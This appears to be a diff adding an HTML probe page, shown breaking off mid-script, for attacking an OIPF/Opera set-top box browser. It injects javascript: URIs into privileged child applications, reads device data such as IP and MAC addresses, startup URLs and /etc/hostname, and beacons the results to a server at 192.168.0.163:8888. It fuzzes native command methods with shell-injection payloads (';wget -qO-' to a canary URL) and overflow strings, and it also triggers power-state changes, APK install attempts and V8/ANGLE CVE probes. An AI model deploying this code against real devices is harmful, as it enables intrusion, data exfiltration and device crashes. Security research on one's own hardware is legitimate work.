@@ -1,0 +1,732 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>OIPF Lifecycle URI Tests</title>
+  <style>
+    body { background:#101820; color:#fff; font:26px Arial,sans-serif; margin:35px; }
+    h1 { color:#e60000; }
+    button { display:block; width:92%; margin:14px; padding:17px; font-size:24px;
+             text-align:left; background:#333; color:#fff; border:3px solid #777; }
+    button:focus { background:#e60000; border-color:#fff; }
+    pre { white-space:pre-wrap; font-size:18px; background:#000; padding:14px; }
+  </style>
+</head>
+<body>
+  <h1>OIPF createApplication URI tests</h1>
+  <button data-case="http">1. HTTP child control</button>
+  <button data-case="data">2. data: HTML beacon</button>
+  <button data-case="javascript">3. javascript: beacon</button>
+  <button data-case="file">4. file:///etc/hostname</button>
+  <button data-case="oipf">5. oipf://test</button>
+  <button data-case="intent">6. intent://test</button>
+  <button data-case="jscontext">7. javascript: child privilege context</button>
+  <button data-case="jsinventory">8. javascript: native method inventory</button>
+  <button data-case="jsnested">9. javascript: nested native inventory</button>
+  <button data-case="jsnested2">10. isolated nested getter inventory</button>
+  <button data-case="jsvalues">11. read-only privileged values</button>
+  <button data-case="jsitems">12. keyset and hardware item inventory</button>
+  <button data-case="jsoutput">13. interfaces and output command discovery</button>
+  <button data-case="jsfilesystem">14. read-only WebKit filesystem boundary</button>
+  <button data-case="jsopera">15. Opera OMI native-object inventory</button>
+  <button data-case="jsruntime">16. Opera OMI runtime information</button>
+  <button data-case="jsruntimevalues">17. Opera OMI runtime values</button>
+  <button data-case="jsemptymessage">18. OMI empty-message validation</button>
+  <button data-case="jsemptystring">19. OMI empty-string message</button>
+  <button data-case="jslistener">20. OMI listener signature test</button>
+  <button data-case="jsemptyjson">21. OMI empty-JSON validation</button>
+  <button data-case="jseventcapture">22. Capture OMI platform events for 60 seconds</button>
+  <button data-case="jsquestionjson">23. OMI malformed {?} message</button>
+  <button data-case="jsremaining">24. Remaining OIPF native-object inventory</button>
+  <button data-case="jsdrmstatus">25. DRM and recorder status inventory</button>
+  <button data-case="jsdrmprototype">26. DRM prototype and recorder values</button>
+  <button data-case="jsdrmempty">27. DRM empty-call validation</button>
+  <button data-case="jsdrmarity">28. DRM argument-count validation</button>
+  <button data-case="jsdrmresponse">29. DRM empty-message response capture</button>
+  <button data-case="jsdrmcapabilities">30. Extract advertised DRM system IDs</button>
+  <button data-case="jsdrmuuid">31. PlayReady and Marlin UUID backend test</button>
+  <button data-case="jsdrmdvb">32. PlayReady and Marlin DVB-URN backend test</button>
+  <button data-case="jseme">33. Browser EME/key-system surface</button>
+  <button data-case="jsemesupport">34. Legacy EME key-system support</button>
+  <button data-case="jsplayreadyempty">35. PlayReady empty key-request validation</button>
+  <button data-case="jsplayreadyloaded">36. PlayReady request after local media load</button>
+  <button data-case="jsplayreadyzero">37. PlayReady zero-length init-data test</button>
+  <button data-case="jsplayreadypssh">38. PlayReady empty valid-PSSH test</button>
+  <button data-case="jsplayreadyfile">39. PlayReady file-read canary</button>
+  <button data-case="jsplayreadychecksum">40. PlayReady checksummed file canary</button>
+  <button data-case="jscenc">41. Genuine CENC media / needkey control</button>
+  <button data-case="jsplayreadycenc">42. CENC with embedded PlayReady PSSH</button>
+  <button data-case="jsomitypes">43. OMI argument types and descriptors</button>
+  <button data-case="jsomischemas">44. OMI harmless message-schema probes</button>
+  <button data-case="jsconfigextra">45. Configuration scExtraCmd discovery</button>
+  <button data-case="jsconfiginjection">46. scExtraCmd shell-boundary canaries</button>
+  <button data-case="jsprivcallables">47. Privileged native callable map</button>
+  <button data-case="jsfactorydebug">48. Factory debug and channel-config probe</button>
+  <button data-case="jschannelextra">49. ChannelConfig scExtraCmd boundary</button>
+  <button data-case="jsmpegsource">50. Native MPEG source-scheme boundary</button>
+  <button data-case="jsmpegfileoracle">51. Sequential local-file oracle validation</button>
+  <button data-case="jslocaltext">52. Local text and subtitle extraction paths</button>
+  <button data-case="jsfilemap">53. Targeted firmware-path oracle map</button>
+  <button data-case="jsfilechildread">54. File-child application document read</button>
+  <button data-case="jsfilechildevent">55. Single file-child load-event inspection</button>
+  <button data-case="jschildrenowner">56. Owner-based child application enumeration</button>
+  <button data-case="jsgettext">57. Configuration getText path-boundary probe</button>
+  <button data-case="jsvideoextra">58. Video extension-command boundary</button>
+  <button data-case="jssettext">59. Configuration setText write-boundary probe</button>
+  <button data-case="jsxhrbinary">60. Legacy XHR local binary-response probe</button>
+  <button data-case="jsapkinstall">61. Android APK installer handoff probe</button>
+  <button data-case="jsapkdirect">62. Direct HTTP APK application probe</button>
+  <button data-case="jsapkdownload">63. APK browser-download handoff probe</button>
+  <button data-case="jslifecyclediff">64. HTTP/file lifecycle differential</button>
+  <button data-case="jsfileexistingonly">65. Existing file lifecycle only</button>
+  <button data-case="jsfilemissingonly">66. Missing file lifecycle only</button>
+  <button data-case="jsfileerrordetail">67. Existing-file load-error detail</button>
+  <button data-case="jsomifuzzread">68. Controlled OMI read-only message fuzz</button>
+  <button data-case="jsandroidsettings">69. Open Android Settings intent</button>
+  <button data-case="jsandroidsettingscomponent">70. Open explicit Android Settings component</button>
+  <button data-case="jsplaystorehandler">71. Google Play HTTPS handler probe</button>
+  <button data-case="jsmarketstore">72. Native Play Store market-scheme probe</button>
+  <button data-case="jssurfacepanel">73. Show SERVICE_PANEL surface</button>
+  <button data-case="jsomiprobenext">74. OMI runtime, vocabulary, callbacks, power event</button>
+  <button data-case="jsomideepcapture">75. Deep-capture OMI callbacks to HTTP server</button>
+  <button data-case="jsnativeboundaryfuzz">76. Crash-tolerant native boundary fuzz</button>
+  <button data-case="jscmdgrammar">77. Native command grammar and argument-shape probe</button>
+  <button data-case="jsopenv8probe">78. Open and run V8 CVE regression probes</button>
+  <button data-case="jsopenconcatisolate">79. Run isolated CVE-2016-1646 concat test</button>
+  <button data-case="jsopenangle1649">80. Run isolated CVE-2016-1649 WebGL test</button>
+  <button data-case="jsopenangle1649exact">81. Run crash-oriented CVE-2016-1649 WebGL2 regression</button>
+  <button data-case="jsandroidbrowser">82. Open fingerprint page with Android browser handler</button>
+  <button data-case="jsbluetoothsettings">83. Open Android Bluetooth settings</button>
+  <button data-case="jskeyboardsettings">84. Open Android keyboard/input settings</button>
+  <pre id="out">Select one test. Results are also sent to the server log.</pre>
+  <script>
+  (function () {
+    var out = document.getElementById('out');
+    var urls = {
+      http: 'http://192.168.0.163:8888/bridge-child.html',
+      data: 'data:text/html,<script>new Image().src="http://192.168.0.163:8888/bridge-log?case=data-executed"<\/script>',
+      javascript: 'javascript:(function(){new Image().src="http://192.168.0.163:8888/bridge-log?case=javascript-executed"})()',
+      file: 'file:///etc/hostname',
+      oipf: 'oipf://test',
+      intent: 'intent://test'
+    };
+    function report(message) {
+      out.textContent += '\n' + message;
+      try { (new Image()).src = '/bridge-log?result=' + encodeURIComponent(message) + '&t=' + Date.now(); } catch (ignore) {}
+    }
+    function run(name) {
+      if (name === 'jsbluetoothsettings' || name === 'jskeyboardsettings') {
+        var settingsAction = name === 'jsbluetoothsettings' ?
+          'android.settings.BLUETOOTH_SETTINGS' : 'android.settings.INPUT_METHOD_SETTINGS';
+        var settingsIntent = 'intent:#Intent;action=' + settingsAction + ';end';
+        report(name + ' START intent=' + settingsIntent);
+        try {
+          var settingsManager = oipfObjectFactory.createApplicationManagerObject();
+          var settingsOwner = settingsManager.getOwnerApplication(document);
+          var settingsChild = settingsOwner.createApplication(settingsIntent, true);
+          report(name + ' createApplication return=' + typeof settingsChild + ':' + String(settingsChild));
+        } catch (settingsCreateError) {
+          report(name + ' createApplication THROW=' + settingsCreateError.name + ':' + settingsCreateError.message);
+        }
+        setTimeout(function () {
+          report(name + ' navigating intent fallback');
+          try { location.href = settingsIntent; }
+          catch (settingsNavigateError) {
+            report(name + ' navigation THROW=' + settingsNavigateError.name + ':' + settingsNavigateError.message);
+          }
+        }, 1200);
+        return;
+      }
+      if (name === 'jsandroidbrowser') {
+        var browserUrl = 'http://192.168.0.163:8888/?autorun=fingerprint';
+        var browserIntent = 'intent://192.168.0.163:8888/?autorun=fingerprint' +
+          '#Intent;scheme=http;action=android.intent.action.VIEW;end';
+        report('androidBrowser START intent=' + browserIntent);
+        try {
+          var browserManager = oipfObjectFactory.createApplicationManagerObject();
+          var browserOwner = browserManager.getOwnerApplication(document);
+          var browserChild = browserOwner.createApplication(browserIntent, true);
+          report('androidBrowser createApplication return=' + typeof browserChild + ':' + String(browserChild));
+        } catch (browserCreateError) {
+          report('androidBrowser createApplication THROW=' + browserCreateError.name + ':' + browserCreateError.message);
+        }
+        setTimeout(function () {
+          report('androidBrowser navigating intent fallback');
+          try { location.href = browserIntent; }
+          catch (browserNavigateError) {
+            report('androidBrowser intent THROW=' + browserNavigateError.name + ':' + browserNavigateError.message);
+            location.href = browserUrl;
+          }
+        }, 1500);
+        return;
+      }
+      if (name === 'jsopenangle1649exact') {
+        location.href = 'http://192.168.0.163:8888/?autorun=angle1649-exact';
+        return;
+      }
+      if (name === 'jsopenangle1649') {
+        location.href = 'http://192.168.0.163:8888/?autorun=angle1649';
+        return;
+      }
+      if (name === 'jsopenconcatisolate') {
+        location.href = 'http://192.168.0.163:8888/?autorun=concat-isolate';
+        return;
+      }
+      if (name === 'jsopenv8probe') {
+        location.href = 'http://192.168.0.163:8888/?autorun=v8';
+        return;
+      }
+      if (name === 'jscmdgrammar') {
+        var grammarLog = function (message) { report('cmdGrammar ' + message); };
+        var f = oipfObjectFactory;
+        var co = null, cc = null;
+        try { co = f.createConfigurationObject().configuration; } catch (e0) {}
+        try { cc = f.createChannelConfig(); } catch (e1) {}
+        var commandTargets = [];
+        if (typeof f.debug === 'function') commandTargets.push({name:'factory.debug', object:f, method:f.debug});
+        if (co && typeof co.scExtraCmd === 'function') commandTargets.push({name:'configuration.scExtraCmd', object:co, method:co.scExtraCmd});
+        if (cc && typeof cc.scExtraCmd === 'function') commandTargets.push({name:'channelConfig.scExtraCmd', object:cc, method:cc.scExtraCmd});
+        var commands = ['help','HELP','Help','get','set','read','write','exec','run','shell','system','command',
+          'info','dump','diag','diagnostic','log','trace','console','service','network','app','application',
+          'platform','omi','pvr','tuner','channel','config','configuration','version','status','list','getVersion',
+          'getStatus','getInfo','getSystemInfo','getConfiguration','listCommands'];
+        var argumentSets = [];
+        for (var ci = 0; ci < commands.length; ci++) {
+          var cmd = commands[ci];
+          argumentSets.push([cmd]);
+          argumentSets.push([cmd, 'OIPF_CANARY_77']);
+          argumentSets.push([cmd + ':OIPF_CANARY_77']);
+          argumentSets.push([cmd + '=OIPF_CANARY_77']);
+          argumentSets.push([JSON.stringify({cmd:cmd, value:'OIPF_CANARY_77'})]);
+        }
+        argumentSets.push([null]);
+        argumentSets.push([undefined]);
+        argumentSets.push([true]);
+        argumentSets.push([false]);
+        argumentSets.push([0]);
+        argumentSets.push([1]);
+        argumentSets.push([100]);
+        argumentSets.push([{}]);
+        argumentSets.push([[]]);
+        argumentSets.push(['A\x00B']);
+        argumentSets.push(['help\x00OIPF_CANARY_77']);
+        argumentSets.push(['help', 0]);
+        argumentSets.push(['help', null]);
+        argumentSets.push(['help', 'OIPF_CANARY_77', 1]);
+        var grammarCases = [], gt, ga;
+        for (gt = 0; gt < commandTargets.length; gt++) {
+          for (ga = 0; ga < argumentSets.length; ga++) {
+            grammarCases.push({target:commandTargets[gt], args:argumentSets[ga], shape:ga});
+          }
+        }
+        var grammarIndex = 0;
+        grammarLog('START targets=' + commandTargets.length + ';cases=' + grammarCases.length);
+        function printableArgs(args) {
+          var result = [];
+          for (var i = 0; i < args.length; i++) {
+            try { result.push(typeof args[i] + ':' + String(args[i]).replace(/\x00/g, '<NUL>')); }
+            catch (e) { result.push('unprintable'); }
+          }
+          return result.join('|');
+        }
+        function nextGrammarCase() {
+          if (grammarIndex >= grammarCases.length) {
+            grammarLog('COMPLETE cases=' + grammarIndex);
+            return;
+          }
+          var item = grammarCases[grammarIndex];
+          var label = 'case=' + grammarIndex + ';target=' + item.target.name +
+                      ';shape=' + item.shape + ';argc=' + item.args.length;
+          grammarLog('BEFORE ' + label + ';args=' + printableArgs(item.args).substring(0, 1200));
+          try {
+            var value = item.target.method.apply(item.target.object, item.args);
+            grammarLog('AFTER ' + label + ';return=' + typeof value + ':' + String(value).substring(0, 1200));
+          } catch (error) {
+            grammarLog('THROW ' + label + ';error=' + error.name + ':' + error.message);
+          }
+          grammarIndex++;
+          setTimeout(nextGrammarCase, 250);
+        }
+        nextGrammarCase();
+        return;
+      }
+      if (name === 'jsnativeboundaryfuzz') {
+        var fuzzLog = function (message) { report('nativeBoundaryFuzz ' + message); };
+        var factory = oipfObjectFactory;
+        var configObject = null, configuration = null, channelConfig = null;
+        try { configObject = factory.createConfigurationObject(); configuration = configObject.configuration; }
+        catch (e0) { fuzzLog('configuration.create.THROW=' + e0); }
+        try { channelConfig = factory.createChannelConfig(); }
+        catch (e1) { fuzzLog('channelConfig.create.THROW=' + e1); }
+        var targets = [];
+        if (typeof factory.debug === 'function') {
+          targets.push({name:'factory.debug', object:factory, method:factory.debug});
+        }
+        if (configuration && typeof configuration.scExtraCmd === 'function') {
+          targets.push({name:'configuration.scExtraCmd', object:configuration, method:configuration.scExtraCmd});
+        }
+        if (channelConfig && typeof channelConfig.scExtraCmd === 'function') {
+          targets.push({name:'channelConfig.scExtraCmd', object:channelConfig, method:channelConfig.scExtraCmd});
+        }
+        var marker = 'http://192.168.0.163:8888/native-canary';
+        var payloads = [
+          '', 'help', '?', 'version', 'status', 'list', 'debug',
+          'OIPF_CANARY_76', '../', '../../etc/hostname', '/etc/hostname',
+          ';wget -qO- ' + marker + '?case=semicolon',
+          '&&wget -qO- ' + marker + '?case=and',
+          '|wget -qO- ' + marker + '?case=pipe',
+          '$(wget -qO- ' + marker + '?case=dollar)',
+          '`wget -qO- ' + marker + '?case=backtick`',
+          '";wget -qO- ' + marker + '?case=doublequote;#',
+          "';wget -qO- " + marker + "?case=singlequote;#",
+          '%s%s%s%s', '%n%n%n%n', '\\x00', '{', '{?}',
+          new Array(257).join('A'), new Array(1025).join('B'), new Array(4097).join('C')
+        ];
+        var cases = [];
+        for (var ti = 0; ti < targets.length; ti++) {
+          for (var pi = 0; pi < payloads.length; pi++) {
+            cases.push({target:targets[ti], payload:payloads[pi], payloadIndex:pi});
+          }
+        }
+        var caseIndex = 0;
+        fuzzLog('START targets=' + targets.length + ';cases=' + cases.length);
+        function nextCase() {
+          if (caseIndex >= cases.length) {
+            fuzzLog('COMPLETE cases=' + caseIndex);
+            return;
+          }
+          var item = cases[caseIndex];
+          var label = 'case=' + caseIndex + ';target=' + item.target.name +
+                      ';payloadIndex=' + item.payloadIndex + ';length=' + item.payload.length;
+          fuzzLog('BEFORE ' + label + ';payload=' + item.payload.substring(0, 300));
+          try {
+            var result = item.target.method.call(item.target.object, item.payload);
+            fuzzLog('AFTER ' + label + ';return=' + typeof result + ':' + String(result).substring(0, 1000));
+          } catch (fuzzError) {
+            fuzzLog('THROW ' + label + ';error=' + fuzzError.name + ':' + fuzzError.message);
+          }
+          caseIndex++;
+          setTimeout(nextCase, 750);
+        }
+        nextCase();
+        return;
+      }
+      if (name === 'jsomideepcapture') {
+        var captureCount = 0;
+        function captureLog(message) {
+          message = String(message);
+          for (var offset = 0; offset < message.length || offset === 0; offset += 900) {
+            report('omiDeepCapture chunk=' + offset + ';' + message.substring(offset, offset + 900));
+            if (!message.length) { break; }
+          }
+        }
+        function inspectValue(label, value) {
+          var parts = [label, 'type=' + typeof value];
+          try { parts.push('string=' + String(value)); } catch (e0) { parts.push('string.THROW=' + e0); }
+          try { parts.push('json=' + JSON.stringify(value)); } catch (e1) { parts.push('json.THROW=' + e1); }
+          try {
+            var names = [], current = value, depth = 0;
+            while (current != null && depth < 5) {
+              var currentNames = Object.getOwnPropertyNames(Object(current));
+              for (var i = 0; i < currentNames.length; i++) {
+                if (names.indexOf(currentNames[i]) < 0) { names.push(currentNames[i]); }
+              }
+              current = Object.getPrototypeOf(Object(current));
+              depth++;
+            }
+            parts.push('properties=' + names.join(','));
+            for (var j = 0; j < names.length && j < 120; j++) {
+              try {
+                var item = value[names[j]];
+                if (item === null || typeof item !== 'object') {
+                  parts.push(names[j] + '=' + typeof item + ':' + String(item));
+                }
+              } catch (propertyError) {
+                parts.push(names[j] + '.THROW=' + propertyError);
+              }
+            }
+          } catch (e2) { parts.push('properties.THROW=' + e2); }
+          captureLog(parts.join(';'));
+        }
+        function deepListener() {
+          captureCount++;
+          captureLog('EVENT#' + captureCount + ';argc=' + arguments.length + ';time=' + Date.now());
+          for (var i = 0; i < arguments.length; i++) {
+            inspectValue('event' + captureCount + '.arg' + i, arguments[i]);
+          }
+        }
+        try {
+          var captureResult = window.opera_omi.addPlatformEventListener(deepListener);
+          captureLog('listener-registered;return=' + typeof captureResult + ':' + String(captureResult));
+        } catch (captureError) {
+          captureLog('listener.THROW=' + captureError.name + ':' + captureError.message);
+        }
+        setTimeout(function () {
+          captureLog('capture-finished;events=' + captureCount);
+        }, 300000);
+        return;
+      }
+      if (name === 'jsomiprobenext') {
+        var x = window.opera_omi;
+        var eventCount = 0;
+        function omiLog(message) { report('omiProbeNext ' + message); }
+        function listener(label) {
+          return function () {
+            eventCount++;
+            var values = [];
+            for (var i = 0; i < arguments.length; i++) {
+              try { values.push(typeof arguments[i] + ':' + String(arguments[i])); }
+              catch (error) { values.push('unprintable:' + String(error)); }
+            }
+            omiLog(label + '.event#' + eventCount + ';argc=' + arguments.length +
+                   ';args=' + values.join('|'));
+          };
+        }
+        try {
+          omiLog('runtimeInfo.memoryControllerEnabled=' + String(x.runtimeInfo.memoryControllerEnabled));
+          omiLog('runtimeInfo.memoryLimit=' + String(x.runtimeInfo.memoryLimit));
+        } catch (runtimeError) {
+          omiLog('runtimeInfo.THROW=' + runtimeError.name + ':' + runtimeError.message);
+        }
+        for (var listenerIndex = 0; listenerIndex < 3; listenerIndex++) {
+          try {
+            var listenerResult = x.addPlatformEventListener(listener('listener' + listenerIndex));
+            omiLog('listener' + listenerIndex + '.return=' + typeof listenerResult + ':' + String(listenerResult));
+          } catch (listenerError) {
+            omiLog('listener' + listenerIndex + '.THROW=' + listenerError.name + ':' + listenerError.message);
+          }
+        }
+        var messages = [
+          JSON.stringify({cmd:'help'}), JSON.stringify({cmd:'omi'}),
+          JSON.stringify({cmd:'platform'}), JSON.stringify({cmd:'app'}),
+          JSON.stringify({cmd:'system'}), JSON.stringify({cmd:'pvr'}),
+          JSON.stringify({cmd:'tuner'}), 'omi', 'platform', 'app', 'system',
+          'pvr', 'tuner', '0', '1', '100', '', '{}', '[]', '{', '{?}',
+          JSON.stringify({}), JSON.stringify({command:'help'}),
+          JSON.stringify({method:'help'}), JSON.stringify({type:'help'})
+        ];
+        for (var messageIndex = 0; messageIndex < messages.length; messageIndex++) {
+          try {
+            var messageResult = x.sendPlatformMessage(messages[messageIndex]);
+            omiLog('message' + messageIndex + '=' + messages[messageIndex] +
+                   ';return=' + typeof messageResult + ':' + String(messageResult));
+          } catch (messageError) {
+            omiLog('message' + messageIndex + '=' + messages[messageIndex] +
+                   ';THROW=' + messageError.name + ':' + messageError.message);
+          }
+        }
+        omiLog('waiting 15s before localSystem.setPowerState(1)');
+        setTimeout(function () {
+          try {
+            var localSystem = oipfObjectFactory.createConfigurationObject().localSystem;
+            omiLog('power.before=' + String(localSystem.powerState) +
+                   ';method=' + typeof localSystem.setPowerState +
+                   ';arity=' + (localSystem.setPowerState && localSystem.setPowerState.length));
+            var powerResult = localSystem.setPowerState(1);
+            omiLog('power.return=' + typeof powerResult + ':' + String(powerResult) +
+                   ';after=' + String(localSystem.powerState));
+          } catch (powerError) {
+            omiLog('power.THROW=' + powerError.name + ':' + powerError.message);
+          }
+        }, 15000);
+        setTimeout(function () {
+          omiLog('capture-finished;events=' + eventCount);
+        }, 120000);
+        return;
+      }
+      if (name === 'jssurfacepanel') {
+        report('START jssurfacepanel');
+        try {
+          report('top.surfaceManager=' + typeof top.surfaceManager +
+                 ' showSurface=' + (top.surfaceManager && typeof top.surfaceManager.showSurface));
+          var result = top.surfaceManager.showSurface('SERVICE_PANEL');
+          report('RETURN jssurfacepanel type=' + typeof result + ' value=' + String(result));
+        } catch (error) {
+          report('THROW jssurfacepanel name=' + error.name +
+                 ' message=' + error.message + ' value=' + String(error));
+        }
+        return;
+      }
+      if (name === 'jscontext') {
+        var payload = "(function(){var r=[];function a(k,v){try{r.push(k+'='+String(v))}catch(e){r.push(k+'=ERR:'+e)}}a('href',location.href);a('origin',location.origin);a('documentURL',document.URL);a('parentSame',parent.location.href);a('topSame',top.location.href);a('factory',typeof oipfObjectFactory);try{var m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document);a('manager',typeof m);a('owner',typeof o);a('ownerCreate',typeof o.createApplication);a('ownerDestroy',typeof o.destroyApplication)}catch(e){a('appManagerError',e)}try{var c=oipfObjectFactory.createConfigurationObject();a('configuration',typeof c.configuration);a('localSystem',typeof c.localSystem);a('scExtraCmd',typeof c.configuration.scExtraCmd)}catch(e){a('configError',e)}(new Image()).src='http://192.168.0.163:8888/bridge-log?context='+encodeURIComponent(r.join(';'))})()";
+        urls.jscontext = 'javascript:' + payload;
+      }
+      if (name === 'jsinventory') {
+        var inventory = "(function(){function send(n,o){var all=[],p=o,d=0;while(p&&d<6){try{var x=Object.getOwnPropertyNames(p);for(var i=0;i<x.length;i++){if(all.indexOf(x[i])<0)all.push(x[i])}p=Object.getPrototypeOf(p);d++}catch(e){all.push('ERR:'+e);break}}(new Image()).src='http://192.168.0.163:8888/bridge-log?inventory='+encodeURIComponent(n+':'+all.sort().join(','))}try{var f=oipfObjectFactory,m=f.createApplicationManagerObject(),o=m.getOwnerApplication(document),c=f.createConfigurationObject();send('factory',f);send('manager',m);send('owner',o);send('configObject',c);send('configuration',c.configuration);send('localSystem',c.localSystem)}catch(e){(new Image()).src='http://192.168.0.163:8888/bridge-log?inventoryError='+encodeURIComponent(String(e))}})()";
+        urls.jsinventory = 'javascript:' + inventory;
+      }
+      if (name === 'jsnested') {
+        var nested = "(function(){function send(n,o){var all=[],p=o,d=0;if(o==null){all.push('NULL')}while(p&&d<5){try{var x=Object.getOwnPropertyNames(p);for(var i=0;i<x.length;i++){if(all.indexOf(x[i])<0)all.push(x[i])}p=Object.getPrototypeOf(p);d++}catch(e){all.push('ERR:'+e);break}}(new Image()).src='http://192.168.0.163:8888/bridge-log?nested='+encodeURIComponent(n+':'+all.sort().join(','))}try{var f=oipfObjectFactory,m=f.createApplicationManagerObject(),o=m.getOwnerApplication(document),c=f.createConfigurationObject(),l=c.localSystem;send('permissions',o.permissions);send('privateData',o.privateData);send('window',o.window);send('startupInformation',l.startupInformation);send('networkInterfaces',l.networkInterfaces);send('outputs',l.outputs);send('tuners',l.tuners)}catch(e){(new Image()).src='http://192.168.0.163:8888/bridge-log?nestedError='+encodeURIComponent(String(e))}})()";
+        urls.jsnested = 'javascript:' + nested;
+      }
+      if (name === 'jsnested2') {
+        var nested2 = "(function(){function beacon(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?isolated='+encodeURIComponent(s)}function inspect(n,get){try{var o=get(),a=[],p=o,d=0;if(o==null){beacon(n+':NULL');return}while(p&&d<5){var x=Object.getOwnPropertyNames(p);for(var i=0;i<x.length;i++){if(a.indexOf(x[i])<0)a.push(x[i])}p=Object.getPrototypeOf(p);d++}beacon(n+':OK:'+a.sort().join(','))}catch(e){var s='';try{s=' name='+e.name+' message='+e.message+' string='+String(e)}catch(z){s=' unprintable'}beacon(n+':THROW:'+s)}}var f=oipfObjectFactory,m=f.createApplicationManagerObject(),o=m.getOwnerApplication(document),c=f.createConfigurationObject(),l=c.localSystem;inspect('permissions',function(){return o.permissions});inspect('privateData',function(){return o.privateData});inspect('window',function(){return o.window});inspect('startupInformation',function(){return l.startupInformation});inspect('networkInterfaces',function(){return l.networkInterfaces});inspect('outputs',function(){return l.outputs});inspect('tuners',function(){return l.tuners})})()";
+        urls.jsnested2 = 'javascript:' + nested2;
+      }
+      if (name === 'jsvalues') {
+        var values = "(function(){var r=[];function g(n,f){try{var v=f();r.push(n+'='+String(v))}catch(e){r.push(n+'=THROW:'+(e.name||'')+':'+(e.message||String(e)))}}var f=oipfObjectFactory,m=f.createApplicationManagerObject(),o=m.getOwnerApplication(document),c=f.createConfigurationObject(),l=c.localSystem,p=o.privateData;g('freeMem',function(){return p.getFreeMem()});g('currentChannel',function(){return p.currentChannel});g('keyset',function(){return p.keyset});g('startup.url',function(){return l.startupInformation.url});g('startup.urlSource',function(){return l.startupInformation.urlSource});g('network.length',function(){return l.networkInterfaces.length});g('outputs.length',function(){return l.outputs.length});g('tuners.length',function(){return l.tuners.length});g('powerState',function(){return l.powerState});g('systemReady',function(){return l.systemReady});(new Image()).src='http://192.168.0.163:8888/bridge-log?values='+encodeURIComponent(r.join(';'))})()";
+        urls.jsvalues = 'javascript:' + values;
+      }
+      if (name === 'jsitems') {
+        var items = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?items='+encodeURIComponent(s)}function one(n,get){try{var o=get(),a=[],p=o,d=0;if(o==null){b(n+':NULL');return}while(p&&d<5){var x=Object.getOwnPropertyNames(p);for(var i=0;i<x.length;i++){if(a.indexOf(x[i])<0)a.push(x[i])}p=Object.getPrototypeOf(p);d++}b(n+':OK:'+a.sort().join(','))}catch(e){b(n+':THROW:'+(e.name||'')+':'+(e.message||String(e)))}}var f=oipfObjectFactory,o=f.createApplicationManagerObject().getOwnerApplication(document),l=f.createConfigurationObject().localSystem;one('keyset',function(){return o.privateData.keyset});one('network0',function(){return l.networkInterfaces.item(0)});one('output0',function(){return l.outputs.item(0)});one('tuner0',function(){return l.tuners.item(0)})})()";
+        urls.jsitems = 'javascript:' + items;
+      }
+      if (name === 'jsoutput') {
+        var output = "(function(){var r=[];function g(n,f){try{r.push(n+'='+String(f()))}catch(e){r.push(n+'=THROW:'+(e.name||'')+':'+(e.message||String(e)))}}var l=oipfObjectFactory.createConfigurationObject().localSystem;for(var i=0;i<l.networkInterfaces.length;i++){(function(i){var n=l.networkInterfaces.item(i);g('net'+i+'.enabled',function(){return n.enabled});g('net'+i+'.connected',function(){return n.connected});g('net'+i+'.ip',function(){return n.ipAddress});g('net'+i+'.mac',function(){return n.macAddress})})(i)}for(var j=0;j<l.outputs.length;j++){(function(j){var o=l.outputs.item(j);g('out'+j+'.name',function(){return o.name});g('out'+j+'.type',function(){return o.type});g('out'+j+'.enabled',function(){return o.enabled});g('out'+j+'.videoMode',function(){return o.videoMode});g('out'+j+'.help',function(){return o.scExtraCmd('help')});g('out'+j+'.question',function(){return o.scExtraCmd('?')});g('out'+j+'.version',function(){return o.scExtraCmd('version')})})(j)}for(var k=0;k<r.length;k+=8){(new Image()).src='http://192.168.0.163:8888/bridge-log?output='+encodeURIComponent(r.slice(k,k+8).join(';'))}})()";
+        urls.jsoutput = 'javascript:' + output;
+      }
+      if (name === 'jsfilesystem') {
+        var filesystem = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?filesystem='+encodeURIComponent(s)}try{webkitRequestFileSystem(TEMPORARY,1024,function(fs){b('sandboxRoot='+fs.root.toURL());try{var rd=fs.root.createReader();rd.readEntries(function(es){var a=[];for(var i=0;i<es.length;i++)a.push(es[i].name+':' +(es[i].isFile?'file':'dir'));b('sandboxEntries='+a.join(','))},function(e){b('sandboxReadError='+e.code)})}catch(e){b('sandboxReaderThrow='+e)}},function(e){b('requestError='+e.code)})}catch(e){b('requestThrow='+e)}try{webkitResolveLocalFileSystemURL('file:///etc/hostname',function(en){b('fileResolve=SUCCESS:'+en.toURL());en.file(function(f){var rd=new FileReader();rd.onload=function(){b('fileContent='+String(rd.result).substring(0,200))};rd.onerror=function(){b('fileReaderError='+rd.error)};rd.readAsText(f)},function(e){b('entryFileError='+e.code)})},function(e){b('fileResolveError='+e.code)})}catch(e){b('fileResolveThrow='+e)}})()";
+        urls.jsfilesystem = 'javascript:' + filesystem;
+      }
+      if (name === 'jsopera') {
+        var operaProbe = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?opera='+encodeURIComponent(s)}function one(n,o){try{if(o==null){b(n+':NULL');return}var a=[],p=o,d=0;while(p&&d<6){var x=Object.getOwnPropertyNames(p);for(var i=0;i<x.length;i++){if(a.indexOf(x[i])<0)a.push(x[i])}p=Object.getPrototypeOf(p);d++}b(n+':'+typeof o+':'+a.sort().join(','))}catch(e){b(n+':THROW:'+(e.name||'')+':'+(e.message||String(e)))}}one('opera_omi',window.opera_omi);one('opera',window.opera);one('cvox',window.cvox);one('__opera_window_type',window.__opera_window_type)})()";
+        urls.jsopera = 'javascript:' + operaProbe;
+      }
+      if (name === 'jsruntime') {
+        var runtime = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?runtime='+encodeURIComponent(s)}function props(n,o){try{if(o==null){b(n+'=NULL');return}var a=[],p=o,d=0;while(p&&d<5){var x=Object.getOwnPropertyNames(p);for(var i=0;i<x.length;i++){if(a.indexOf(x[i])<0)a.push(x[i])}p=Object.getPrototypeOf(p);d++}b(n+'.type='+typeof o+';string='+String(o)+';props='+a.sort().join(','))}catch(e){b(n+'=THROW:'+(e.name||'')+':'+(e.message||String(e)))}}var x=window.opera_omi;props('runtimeInfo',x.runtimeInfo);b('sendPlatformMessage.type='+typeof x.sendPlatformMessage+';arity='+(x.sendPlatformMessage&&x.sendPlatformMessage.length));b('addPlatformEventListener.type='+typeof x.addPlatformEventListener+';arity='+(x.addPlatformEventListener&&x.addPlatformEventListener.length))})()";
+        urls.jsruntime = 'javascript:' + runtime;
+      }
